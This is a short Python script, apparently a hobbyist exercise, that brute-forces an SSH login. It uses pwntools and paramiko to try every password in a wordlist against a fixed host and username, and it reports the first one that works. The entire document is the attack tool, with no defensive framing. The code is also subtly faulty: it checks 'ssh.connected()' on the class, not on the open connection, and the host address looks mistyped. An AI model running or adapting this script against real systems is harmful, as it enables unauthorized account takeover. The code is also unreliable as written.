# sudo service ssh start 
from pwn import *
import paramiko

host = "197.0.0.1"
username = "DESKTOP"
attempts = 0

with open('baba.txt','r') as pass_list:
    for passwds in pass_list:
        passwds = passwds.strip("\n")
        try:
            print(f"{attempts} Attempting password : {passwds}")
            response = ssh(host=host, user=username, password=passwds , timeout=1 )
            if ssh.connected():
                print(f"Password found : {passwds}")
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("invalid password !")
        attempts+=1
